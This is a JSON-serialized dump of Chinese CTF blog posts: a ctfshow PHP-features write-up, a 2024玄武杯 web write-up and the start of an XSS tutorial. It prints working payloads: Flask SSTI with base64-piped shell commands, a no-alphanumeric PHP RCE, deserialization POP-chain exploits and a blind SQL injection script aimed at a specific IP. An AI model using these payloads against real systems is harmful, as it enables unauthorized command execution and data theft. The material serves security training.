private $secret;\n\n    function __construct(){\n        $this->vip = 0;\n        $this->secret = $flag;\n    }\n\n    function __destruct(){\n        echo $this->secret;\n    }\n\n    public function isVIP(){\n        return $this->vip?TRUE:FALSE;\n        }\n    }\n\n    function __autoload($class){\n        if(isset($class)){\n            $class();\n    }\n}\n\n#过滤字符\n$key = $_SERVER['QUERY_STRING'];\nif(preg_match('/\\_| |\\[|\\]|\\?/', $key)){\n    die(\"error\");\n}\n$ctf = $_POST['ctf'];\nextract($_GET);\nif(class_exists($__CTFSHOW__)){\n    echo \"class is exists!\";\n}\n\nif($isVIP && strrpos($ctf, \":\")===FALSE && strrpos($ctf,\"log\")===FALSE){\n    include($ctf);\n}\n\n```\n\n这个相对上一题的话是禁用了日志注入的，不过这个出题人也是有点坑咱哈，在isVIP方法后门就结束了对CTFSHOW类的描述，所以__autoload()方法并不属于CTFSHOW类\n\n那我们分析一下这个额外的方法\n\n### __autoload\n\n这是PHP中一个特殊函数，用于在需要但尚未定义的类被实例化时自动加载类文件\n\n__autoload 尝试加载未定义的类，在进行if(class_exists($__CTFSHOW__))判断时，会自动调用__autoload 这个方法。那么我们直接让__CTFSHOW__等于phpinfo，在调用__autoload时后面会执行$class()；，即执行phpinfo()。\n\n但是在正则匹配中过滤了下划线，导致我们无法正常的传入\\__CTFSHOW__类，这时候应该怎么办呢？\n\n联想到关于php 中变量名的命名规则，当变量名解析过程中碰到小数点的时候会自动将小数点化成下划线\n\n所以我们的payload\n\n```php\n?..CTFSHOW..=phpinfo\n```\n\n![image-20241124135802550](./../image/achieve/202411/php特性---ctfshow/image-20241124135802550.png)\n\n然后在里面搜索flag就可以了\n\n![image-20241124135840096](./../image/achieve/202411/php特性---ctfshow/image-20241124135840096.png)\n","tags":["php特性"],"categories":["ctfshow"]},{"title":"2024玄武杯wp--web方向(已做完)","url":"/2024/11/07/2024玄武杯wp--web方向(已做完)/","content":"\n# web\n\n## ez_flask\n\n打开zip文件中的app.py\n\n```php\nfrom flask import Flask, render_template_string, render_template\n\napp = Flask(__name__)#创建一个flask实例\n\n@app.route('/hello/')\ndef hello():\n    return render_template('hello.html')\n\n@app.route('/hello/<name>')\ndef hellodear(name):\n    if \"ge\" in name:\n        return render_template_string('hello %s' % name)\n    elif \"f\" not in name:\n        return render_template_string('hello %s' % name)\n    else:\n        return 'nonono!'\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0',port='5000',debug=True)  # 在生产环境中应关闭调试模式\n```\n\n考点:Flask下SSTI漏洞\n\n`__class__`:用于返回对象所属的类\n\n`__base__`:以字符串的形式返回一个类所继承的类\n\n`__bases__`:以元组的形式返回一个类所继承的类\n\n`__mro__`:返回解析方法调用的顺序，按照子类到父类到父父类的顺序返回所有类（当调用_mro_[1]或者-1时作用其实等同于_base_）\n\n```\n第一步，拿到当前类，也就是用__class__\nurl/hello/name={{\"\".__class__}}\n<class 'str'>\n第二步，拿到基类，这里可以用__base__，也可以用__mro__\nurl/hello/name={{\"\".__class__.__base__}}\n<class 'object'>\n//object为str的基类\nobject是父子关系的顶端，所有的数据类型最终的父类都是object\nurl/hello/name={{\"\".__class__.__mro__}}\n(<class 'str'>, <class 'object'>)\n```\n\n`__subclasses__()`:获取类的所有子类\n\n`__init__`:所有自带带类都包含init方法，常用他当跳板来调用globals\n\n`__globals__`:会以字典类型返回当前位置的全部模块，方法和全局变量，用于配合init使用\n\n```\n第三步，拿到基类的子类，用__subclasses__()\nurl/hello/name={{\"\".__class__.__base__.__subclasses__()}}\n```\n\n![image-20241109202545786](./../image/achieve/202411/2024玄武杯/image-20241109202545786.png)\n\n可以看到object类下面有很多子类\n\n接下来的话，就要找可利用的类，寻找那些有回显的或者可以执行命令的类\n大多数利用的是`os._wrap_close`这个类，我们这里可以用一个简单脚本来寻找它对应的下标\n\n![image-20241109202827674](./../image/achieve/202411/2024玄武杯/image-20241109202827674.png)\n\n可以看到下标是155，但因为是从0开始的，所以我们应该选择下标为154，实在不行看看就知道了\n\n```\nurl/hello/name={{\"\".__class__.__bases__[0]. __subclasses__()[154]}}\n```\n\n![image-20241109203217873](./../image/achieve/202411/2024玄武杯/image-20241109203217873.png)\n\n可以看到确实是我们想要的子类\n\n接下来就可以利用`os._wrap_close`\n首先先调用它的__init__方法进行初始化类\n\n```\nurl/hello/name={{\"\".__class__.__bases__[0]. __subclasses__()[154].__init__}}\n```\n\n![image-20241109203340160](./../image/achieve/202411/2024玄武杯/image-20241109203340160.png)\n\n可以看到初始化后也是返回了一个地址\n\n然后再调用__globals__获取到方法内以字典的形式返回的方法、属性等\n\n```\nname={{\"\".__class__.__bases__[0]. __subclasses__()[154].__init__.__globals__}}\n```\n\n然后在这些方法和属性里面就可以找到我们想要的flag了\n\n不过这个做法有点像非预期解哈，感觉跟源代码没什么特别的关系\n\n正常的做法在构造payload的时候需要绕过字母f，我们可以正常用base编码进行绕过\n\n```\nurl/hello/name={{g.pop.__globals__.__builtins__['__import__']('os').popen('echo dGFjIC9mKg==|base64 -d|sh').read()}}\n```\n\n1. `g.pop`：这里`g`是一个变量，`pop`是`g`的一个属性，它用于从列表中弹出（删除并返回）最后一个元素。\n2. `.__globals__`：`__globals__`是获取对象的全局命名空间的特殊属性。它可以访问包含全局变量和内置模块的字典。\n3. `__builtins__`：`__builtins__`是Python解释器中的一个内置模块，它包含了Python的内置函数和异常。通过`__builtins__`，我们可以访问内置模块中的函数。\n4. `['__import__']('os')`：这是通过`__builtins__`字典访问`__import__`函数，并传入字符串`'os'`作为参数。`__import__`函数用于动态导入模块，这里我们尝试导入`os`模块，它提供了访问操作系统功能的接口。\n5. `.popen('echo dGFjIC9mKg==|base64 -d|sh').read()`：在成功导入`os`模块后，我们调用`popen`函数，并传入恶意命令字符串`'echo dGFjIC9mKg==|base64 -d|sh'`作为参数。该命令使用`base64`解码字符串`dGFjIC9mKg==`，然后将结果作为shell命令执行，并返回输出结果。\n\n## ez_love\n\n你会表白多少次？520次？\n\n有一个ziip文件，下载下来有app.py\n\n打开看一下\n\n```py\nfrom flask import Flask, session, request, jsonify, render_template_string\nimport os\n\napp = Flask(__name__)\napp.secret_key = 'cdusec'  # 设置一个秘密密钥\n\n# 存储表白次数的字典\nconfessions = {}\n\n\n# 主页\n@app.route('/')\ndef index():\n    # 初始化 session\n    if 'user_id' not in session:\n        session['user_id'] = 'anonymous'\n    if 'is_admin' not in session:\n        session['is_admin'] = 0\n\n    user_id = session.get('user_id', 'anonymous')\n    confessions_count = confessions.get(user_id, 0)\n\n    return render_template_string('''\n        <!doctype html>\n        <html>\n        <head>\n            <title>表白墙</title>\n            <link rel=\"stylesheet\" href=\"{{ url_for('static', filename='styles.css') }}\">\n            <script src=\"https://code.jquery.com/jquery-3.6.0.min.js\"></script>\n            <script src=\"{{ url_for('static', filename='script.js') }}\"></script>\n        </head>\n        <body>\n            <div class=\"background\">\n                <div class=\"container\">\n                    <h1>表白墙</h1>\n                    <form id=\"confess-form\">\n                        <input type=\"text\" id=\"confessor\" name=\"confessor\" placeholder=\"表白人\">\n                        <input type=\"text\" id=\"confessee\" name=\"confessee\" placeholder=\"被表白人\">\n                        <input type=\"text\" id=\"message\" name=\"message\" placeholder=\"请输入你的表白\">\n                        <button type=\"submit\">表白</button>\n                    </form>\n                    <p>你已经表白 <span id=\"confessions-count\">{{ confessions_count }}</span> 次</p>\n                    <div id=\"flag-section\" style=\"display:none;\">\n                        <p>你已经表白520次，恭喜你获得了flag！</p>\n                        <form id=\"get-flag-form\">\n                            <button type=\"submit\">获取flag</button>\n                        </form>\n                    </div>\n                </div>\n            </div>\n        </body>\n        </html>\n    ''', confessions_count=confessions_count)\n\n\n# 处理表白\n@app.route('/confess', methods=['POST'])\ndef confess():\n    confessor = request.form['confessor']\n    confessee = request.form['confessee']\n    message = request.form['message']\n    user_id = session.get('user_id', 'anonymous')\n    is_admin = session.get('is_admin', 0)\n\n    if user_id not in confessions:\n        confessions[user_id] = 0\n\n    if is_admin == 1:\n        confessions[user_id] += 1\n\n    return jsonify(success=True, confessions=confessions[user_id])\n\n\n# 获取flag\n@app.route('/flag', methods=['GET', 'POST'])\ndef get_flag():\n    user_id = session.get('user_id', 'anonymous')\n    is_admin = session.get('is_admin', 0)\n    key = request.args.get('key') or request.form.get('key')\n\n    if key != 'cdusec':\n        return jsonify(success=False, message=\"无效的密钥\")\n\n    if is_admin == 1 and user_id in confessions and confessions[user_id] >= 520:\n        flag = get_flag_from_root()\n        return jsonify(success=True, flag=flag)\n    else:\n        return jsonify(success=False, message=\"你还没有表白520次或不是管理员！\")\n\n\n# 获取根目录下的flag\ndef get_flag_from_root():\n    flag_path = '/flag'  # 替换为实际的flag路径\n    with open(flag_path, 'r') as f:\n        flag = f.read().strip()\n    return flag\n\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\n\n我们先分析一下代码\n\n这里是基于flask框架做的一个项目程序\n\n设置一个秘密密钥app.secret_key = 'cdusec'\n\n设置了一个存储表白次数的字典confessions\n\n- 先看主页部分\n\n@app.route('/')\n\n这里是route()装饰器，使用route（）装饰器告诉Flask什么样的URL能触发我们的函数.route（）装饰器把一个函数绑定到对应的URL上，这句话相当于路由，一个路由跟随一个函数\n\n举个例子:\n\n```python\n@app.route('/')\ndef test()\"\n   return 123\n```\n\n访问127.0.0.1:5000/则会输出123\n\n另外还可以设置动态网址\n\n```python\n@app.route(\"/hello/<username>\")\ndef hello_user(username):\n  return \"user:%s\"%username\n```\n\n根据url里的输入，动态辨别身份\n\n![img](./../image/achieve/202411/web入门爆破篇-ctfshow/20181221164849-3c22e678-04fd-1.png)\n\n1. 当我们访问url/的时候，session会进行初始化，将user_id的值设为anonymous，将is_admin的值设为0\n2. confessions_count = confessions.get(user_id, 0)这里从 `confessions` 字典中获取 `user_id` 对应的值，并将其赋值给 `confessions_count` 变量。如果 `confessions` 字典中没有 `user_id`，则返回默认值 `0`\n\n- 再看表白部分\n\n1. @app.route('/confess', methods=['POST'])是一个 Flask 路由装饰器，用于定义一个处理 `/confess` 路径的 POST 请求的路由，这个路由只接受 POST 请求。如果客户端使用其他 HTTP 方法（如 GET、PUT、DELETE 等）访问这个路径，服务器会返回 405 Method Not Allowed 错误，例如我们如果直接访问这个网站的话就会出现405错误\n\n![image-20241107195505601](./../image/achieve/202411/2024玄武杯/image-20241107195505601.png)\n\n1. 这里定义了confessor，confessee，message，从HTTP POST请求的表单数据中提取\n2. if user_id not in confessions:\n           confessions[user_id] = 0\n       if is_admin == 1:\n           confessions[user_id] += 1这里进行了检测，如果user_id不在字典里面，就会让字典里的user_id值等于0，如果is_admin的值等于1，那么字典里的user_id的值就自增（这里很关键）\n3. return jsonify(success=True, confessions=confessions[user_id])表示最后会返回一个ture和字典中user_id的值，转化JSON响应返回\n\n- 再看获取flag部分\n\n1. key = request.args.get('key') or request.form.get('key')首先尝试从 URL 查询参数中获取 `key`，如果 URL 查询参数中没有 `key`，则尝试从 POST 请求的表单数据中获取 `key`，意思就是我们可以通过GET或者POST去传递key的值\n2. 如果key的值不等于cdusec，就会返回错误\n3. 如果is_admin == 1 and user_id in confessions and confessions[user_id] >= 520成立，则会从get_flag_from_root()函数中获取flag进行赋值，不然就会返回错误信息\n\n获取根目录下的flag就不用看了，对解题没什么作用\n\n总结一下我们的思路\n\n1.我们需要设置session中user_id和is_admin的值\n\n2.需要满足的条件：user_id的值为1,字典中is_admin的值为520,key的值为cdusec\n\n猜测是flask下的session伪造\n\n那我们开始解题\n\n先开启环境访问url/\n\n![image-20241107202656637](./../image/achieve/202411/2024玄武杯/image-20241107202656637.png)\n\n因为访问/confess会出错，我们需要改成post的数据包，所以我们用burpsuite抓包，然后改成post数据包\n\n\n\n![image-20241107203105017](./../image/achieve/202411/2024玄武杯/image-20241107203105017.png)\n\n我们先传参数confessor，confessee，message看看\n\n![image-20241107203233369](./../image/achieve/202411/2024玄武杯/image-20241107203233369.png)\n\n这里可以看到confessions还是0，可能是里面没有user_id，这时候我们需要设置session中user_id的值\n\n这里就涉及到flask的session伪造了\n\n### flask下的session伪造\n\n**session的作用**\n\n由于http协议是一个无状态的协议，也就是说同一个用户第一次请求和第二次请求是完全没有关系的，但是现在的网站基本上有登录使用的功能，这就要求必须实现有状态，而session机制实现的就是这个功能。\n用户第一次请求后，将产生的状态信息保存在session中，这时可以把session当做一个容器，它保存了正在使用的所有用户的状态信息；这段状态信息分配了一个唯一的标识符用来标识用户的身份，将其保存在响应对象的cookie中；当第二次请求时，解析cookie中的标识符，拿到标识符后去session找到对应的用户的信息\n\n所以这就是为什么我们先要访问url/的原因，就是对session进行初始化\n\nsession是在服务端用来存储用户信息的,类似于来宾登记表,通过http报文中的cookie进行传递.由于flask轻量级的设计,因此session是存储在客户端的,因此也带来了flask session伪造的风险.\n\n**flask session的储存方式**\n\n第一种方式：直接存在客户端的cookies中\n\n第二种方式：存储在服务端，如：redis,memcached,mysql，file,mongodb等等，存在flask-session第三方库\n\n**flask的session可以保存在客户端的cookie**中，那么就会产生一定的安全问题。\n\n那么后面我们就可以根据cookie中的session的值进行修改了\n\nflask中的session通过`app.secret_key = ...`来设置.\n\n源代码中的secret_key的值为cdusec\n\nflasksession通常是由三部分组成，中间通过`.`来进行分割.第一部分就是我们json形式的数据通过base64加密后的结果，第二部分是时间戳，也算是签名算法，第三部分就是我们的密钥签名\n\n时间戳：用来告诉服务端数据最后一次更新的时间，超过31天的会话，将会过期，变为无效会话；\n\n签名：是利用`Hmac`算法，将session数据和时间戳加上`secret_key`加密而成的，用来保证数据没有被修改。\n\n我们先来分析这段session的值\n\neyJpc19hZG1pbiI6MCwidXNlcl9pZCI6ImFub255bW91cyJ9.ZyyyoQ.M_fymfx7RJybrgZwoZv_hp2wLe0\n\n这里先给一个解密的脚本:\n\n### 解密脚本\n\n```python\n#!/usr/bin/env python3\nimport sys\nimport zlib\nfrom base64 import b64decode\nfrom flask.sessions import session_json_serializer\nfrom itsdangerous import base64_decode\n\n\ndef decryption(payload):\n    payload, sig = payload.rsplit(b'.', 1)\n    payload, timestamp = payload.rsplit(b'.', 1)\n\n    decompress = False\n    if payload.startswith(b'.'):\n        payload = payload[1:]\n        decompress = True\n\n    try:\n        payload = base64_decode(payload)\n    except Exception as e:\n        raise Exception('Could not base64 decode the payload because of '\n                        'an exception')\n\n    if decompress:\n        try:\n            payload = zlib.decompress(payload)\n        except Exception as e:\n            raise Exception('Could not zlib decompress the payload before '\n                            'decoding the payload')\n\n    return session_json_serializer.loads(payload)\n\n\nif __name__ == '__main__':\n    print(decryption(\"eyJpc19hZG1pbiI6MCwidXNlcl9pZCI6ImFub255bW91cyJ9.ZyyyoQ.M_fymfx7RJybrgZwoZv_hp2wLe0\".encode()))#把需要加密的flasksession的值换一下就行\n\n```\n\n换成我们的session的值后打印出来的数据是\n\n![image-20241107204355502](./../image/achieve/202411/2024玄武杯/image-20241107204355502.png)\n\n可以看到里面就是我们想要的is_admin和user_id\n\n因为flask session是利用hmac算法将session数据，时间戳加上secert_keybase64加密而成的，那么我们要进行session伪造就要先得到secret_key，当我们得到secret_key我们就可以很轻松的进行session伪造。因为这里我们已知secret_key的值了就可以直接进行session伪造了\n\n### flask_unsign进行加密和解密\n\n安装:\n\n```\npip install flask-unsign\n```\n\n先对cookie进行解密\n\n```\nflask-unsign --decode --cookie 'eyJpc19hZG1pbiI6MCwidXNlcl9pZCI6ImFub255bW91cyJ9.ZyyyoQ.M_fymfx7RJybrgZwoZv_hp2wLe0'\n```\n\n签名加密\n\n```\nflask-unsign --sign --cookie \"json数据\" --secret '密钥'\n```\n\n这里我将user_id设为2看看\n\n![image-20241107205626910](./../image/achieve/202411/2024玄武杯/image-20241107205626910.png)\n\n将加密后的session替换，然后发包，发现次数变成1了，再发包看看，发现又变成2了，那我们就用爆破进行自己发包就行\n\n![image-20241107210149947](./../image/achieve/202411/2024玄武杯/image-20241107210149947.png)\n\n![image-20241107210212753](./../image/achieve/202411/2024玄武杯/image-20241107210212753.png)\n\n什么方法都行，只要能发包发520次就能让字典的user_id变成520\n\n![image-20241107210342956](./../image/achieve/202411/2024玄武杯/image-20241107210342956.png)\n\n可以看到这里是满足大于520的条件了的，并且我们的is_admin的值也是1\n\n那就访问/flag然后给key传递cdusec就可以拿到flag了\n\n![image-20241107210536492](./../image/achieve/202411/2024玄武杯/image-20241107210536492.png)\n\n## ez_rce\n\n先看题目\n\n```php\n<?php\nerror_reporting(0);\nshow_source(__FILE__);\nif (isset($_POST['cdu_sec.wi'])){\n    $CDUSec=$_POST['cdu_sec.wi'];\n    if(is_string($CDUSec)){\n        if(!preg_match(\"/[a-zA-Z0-9@#%^&*:{}\\-<\\?>\\\"|`~\\\\\\\\]/\",$CDUSec)){\n            eval($CDUSec);\n        }else{\n            echo \"怎么是杂鱼~~,Can you hack me?\";\n        }\n    }else{\n        echo \"bushi,你连第一层都过不去？\";\n    }\n}\n```\n\n这不就是每周大挑战的极限rce嘛，这里我们先拿那道题来讲解一下\n\n### 每周大挑战rce2\n\n```php\n<?php\n//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nif (isset($_POST['ctf_show'])) {\n    $ctfshow = $_POST['ctf_show'];\n    if (is_string($ctfshow)) {\n        if (!preg_match(\"/[a-zA-Z0-9@#%^&*:{}\\-<\\?>\\\"|`~\\\\\\\\]/\",$ctfshow)){\n            eval($ctfshow);\n        }else{\n            echo(\"Are you hacking me AGAIN?\");\n        }\n    }else{\n        phpinfo();\n    }\n}\n?>\n```\n\n基本把能用的都过滤了，那我们就先用脚本把能用的字符打印出来看看\n\n```php\n<?php\nfor ($i=32;$i<127;$i++){\n        if (!preg_match(\"/[a-zA-Z0-9@#%^&*:{}\\-<\\?>\\\"|`~\\\\\\\\]/\",chr($i))){\n            echo chr($i).\" \";\n        }\n}\n/*\n! $ ' ( ) + , . / ; = [ ] _ \n*/\n```\n\n这里我们用自增rce进行绕过命令执行\n\n思路就是，我们rce需要字母，但字母都过滤了，所以我们就要想办法去构造字母\n\n#### 自增rce\n\n在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为`Array`\n\n```php\n<?php\n$a = []._;\n//$a为“Array_”\necho $a[0];\n//会输出：A\n$b = $a[0];\necho ++$b;\n//会输出：B\n?>\n```\n\n因为数字也过滤掉了，变量名可以用下划线替代，`$a[0]`中的数字0也可以用下划线替代\n\n```php\n<?php\n$_ = []._;\necho $_[_];\n//输出：A\n?>\n```\n\n我们想传入POST的payload是\n\n```\ncdu_sec.wi=$_POST[_]($_POST[__])\n```\n\nexp:\n\n```php\n<?php\n$_=[].'';//Array\n$_=$_[''=='$'];//A\n$____='_';//_\n$__=$_;//A\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//P\n$____.=$__;//_P\n$__=$_;//A\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//O\n$____.=$__;//_PO\n$__=$_;//A\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//S\n$____.=$__;//_POS\n$__=$_;//A\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//T\n$____.=$__;//_POST\n$_=$____;//_POST\n\n$$_[__]($$_[_]);//$_POST[__]($_POST[_]);\n```\n\n这里得对exp进行url编码再传入\n\n```\nctf_show=%24%5F%3D%5B%5D%2E%27%27%3B%24%5F%3D%24%5F%5B%27%27%3D%3D%27%24%27%5D%3B%24%5F%5F%5F%5F%3D%27%5F%27%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%3D%24%5F%5F%5F%5F%3B%24%24%5F%5B%5F%5F%5D%28%24%24%5F%5B%5F%5D%29%3B&__=system&_=cat /f1agaaas\n```\n\n让我们来看这道题，其实跟上面的rce2是一样的，唯一的不同点是变量名增加了一点考察\n\n根据php特性我们可以知道，变量名的命名规则是\n\n- 变量以 $ 符号开头，其后是变量的名称。\n- 变量名称必须以字母或下划线开头。\n- 变量名称不能以数字开头。\n- 变量名称只能包含字母数字字符和下划线（A-z、0-9 以及 _）。\n\n而cdu_sec.wi这个变量名中出现了一个小数点，那就是不符合规则的变量名，我们就得想办法去绕过\n\n**在 PHP 8 之前 的版本中，当参数名中含有 `.`（点号）或者`[`(下划线)时，会被自动转为 `_`（下划线）。如果`[`出现在参数中使得错误转换导致接下来如果该参数名中还有`非法字符`并不会继续转换成下划线`_`，但是如果参数最后出现了`]`,那么其中的非法字符还是会被正常解析(不会转换)，因为被当成了数组**\n\n所以我们的变量名应该设为cdu[sec.wi再进行传入就可以了\n\n当然也可以构造get形式的paylaod\n\n```\nPOST：\ncdu[sec.wi=$_=[]._;$_=$_['_'];$_++;$_++;$_++;$__=++$_;$_++;$__=++$_.$__;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__=$__.++$_;$_=_.$__;$$_[_]($$_[__]);\nGET：\n?_=system&__=tac /f1ag;\n```\n\n## ez_pop\n\n```php\n<?php\nshow_source(__FILE__);\nerror_reporting(0);\nclass C{\n    private $name;\n    private $age;\n    public function __construct($name,$age)#构造函数，当一个对象创建时被调用。具有构造函数的类会在每次创建新对象时先调用此方法\n    {\n        $this->age=$age;\n        $this->name=$name;\n    }\n    public function __destruct()#当一个对象销毁时被调用。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行\n    {\n        echo $this->name->me;\n    }\n}\nclass D{\n    public $source;\n    public $str;\n    public function __toString()#当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串\n    {\n        eval($this->str->source);\n    }\n    public function __wakeup()#反序列化恢复对象之前调用该方法\n    {\n        $this->str=\"baozongwi\";\n    }\n}\nclass U{\n    public $cmd;\n    public function __invoke()#当你尝试将一个对象像函数一样调用时，__invoke() 会被触发。\n    {\n        echo $this->cmd;\n    }\n}\nclass sec{\n    public $p;\n    public function __get($p)#读取不可访问或者是不存在的属性时触发，用于从不可访问的属性读取数据，即在调用私有属性的时候会自动执行\n    {\n        $function=$this->p;\n        return $function();\n    }\n}\n\nif(isset($_GET['a'])){\n    $b=unserialize($_GET['a']);\n}\n```\n\n分析完这些魔术方法我们接下来就应该构造我们的pop链了\n\n构造pop链，我一般会先把链子的入口和出口找出来，这里可以看到，在__toString()魔术方法中有危险函数eval，那么这个魔术方法就可以作为我们的出口，先来分析一下这段代码\n\n eval($this->str->source);\n\n- $this->str---调用父类中的str属性\n- $this->str->source---由于这里多了一个source，所以这里的str不应该是属性而应该是一个类，从str类中调用source\n\n那么我们不难想到，我们应该让str变成一个实例化对象，然后让source的值设为我们要执行的恶意代码，那我们就可以继续推我们的pop链了\n\n那什么类中有source属性，那就是他本身的D类了，这里可以我们可以用指针引用，令str的值指向D类，那么在执行eval函数的时候我们的str会调用D类中的source去执行\n\n这里可以看到在D类中有一个wakeup魔术方法，他会让str赋值成\"baozongwi\"，而我们需要的是将str变成一个实例化对象，所以我们应该绕过wakeup\n\n那么我们的入口只能是__destruct魔术方法，接下来我们就可以构造pop链\n\n```php\nC::destruct->sec::get->U::invoke->D::toString\n```\n\n那就写个poc\n\n```php\n<?php\nclass C{\n    public $name;\n    public $age;\n}\nclass D{\n    public $source;\n    public $str;\n}\nclass U{\n    public $cmd;\n}\nclass sec{\n    public $p;\n}\n#实例化对象\n$sec = new sec();\n$u = new U();\n$d = new D();\n$c = new C();\n$c->name=$sec;\n$sec->p=$u;\n$u->cmd=$d;\n$d->str=&$d;\n$d->source=\"system('ls /');\";\necho str_replace('O:1:\"D\":2:','O:1:\"D\":3:',serialize($C));#wakeup()绕过方法\n```\n\n通过修改属性的个数\n\n我们需要先把name设置为public的属性，不然我们在赋值的时候就会出错\n\n为了更直观的看到pop链的构造，我搬来了baozongwi的poc\n\n```php\n<?php\nclass C{\n    public $name;\n}\nclass D{\n    public $source;\n    public $str;\n}\nclass U{\n    public $cmd;\n}\nclass sec{\n    public $p;\n}\n$a=new C();\n$a->name=new sec();\n$a->name->p=new U();\n$a->name->p->cmd=new D();\n$a->name->p->cmd->str=new D();\n$a->name->p->cmd->str->source=\"system('tac /f*');\";\n$b=serialize($a);\n$c=urlencode($b);\n$d=str_replace(\"4%3A%22name\",\"7%3A%22%00C%00name\",$c);\necho $d;\n```\n\n绕过`wakeup`的方法是利用`fast_destruct`\n\n修改source属性的payload就可以拿到flag了\n\n## baby_sql\n\n先看题目\n\n![image-20241109205112264](./../image/achieve/202411/2024玄武杯/image-20241109205112264.png)\n\n是一个登录界面，随便输入一下登录，发现页面只会输出用户名和密码错误那就看看有没有其他的目录\n\n用dirsearch扫一下目录，发现有config.php和register.php，分别访问一下发现只要register.php是可以访问的\n\n![image-20241109205510456](./../image/achieve/202411/2024玄武杯/image-20241109205510456.png)\n\n![image-20241109205604597](./../image/achieve/202411/2024玄武杯/image-20241109205604597.png)\n\n经典的注册页面\n\n参考了wp后发现是二次注入+盲注\n\n直接挪一下脚本放着，以后学了二次盲注再返回了做这道题\n\n```php\nimport requests\nimport re\n\nsess = requests.Session()\n\nurl = \"http://27.25.151.48:8308/\"\ntarget = \"\"\ni = 0\nfor j in range(45):\n    i += 1\n    # payload=\"0'+ascii(substr((database()) from {} for 1))+'0;\".format(i)\n    payload = \"0'+ascii(substr((select * from flag) from {} for 1))+'0;\".format(i)\n\n    register = {'email': '12{}3@qq.com'.format(i), 'username': payload, 'password': 123456}\n    login = {'email': '12{}3@qq.com'.format(i), 'password': 123456}\n\n    r1 = sess.post(url=url + 'register.php', data=register)\n    r2 = sess.post(url=url + 'login.php', data=login)\n    r3 = sess.post(url=url + 'index.php')\n    content = r3.text\n\n    # 捕捉ascii码\n    con = re.findall('<span class=\"user-name\">(.*?)</span>', content, re.S | re.M)\n    a = int(con[0].strip())\n    target += chr(a)\n    print(\"\\r\" + target, end=\"\")\n```\n\n\n\n\n\n","tags":["2024玄武杯"],"categories":["赛题wp"]},{"title":"web入门xss篇--ctfshow","url":"/2024/11/05/web入门XSS篇-ctfshow/","content":"\n# XSS跨站漏洞\n\n![img](./../image/achieve/202411/xss--ctfshow/5f70a851a75b0b3fe878509047de5fd6.png)\n\n## 0x01xss前言\n\n之前对xss跨站攻击只是停留在概念的理解上，这次开始做ctfshow的xss部分，那就深入学习一下xss吧\n\n## 0x02xss介绍\n\n### 原理\n\n![img](./../image/achieve/202411/xss--ctfshow/QQ20240925-135455.png)\n\n![image](./../image/achieve/202411/xss--ctfshow/1653879435_6294328b016b58c8721cf.png!small)\n\n- 简单来说就是恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行\n\n### 概念\n\nXSS (Cross Site Scripting) 攻击全称跨站脚本攻击，是一种经常出现在 Web 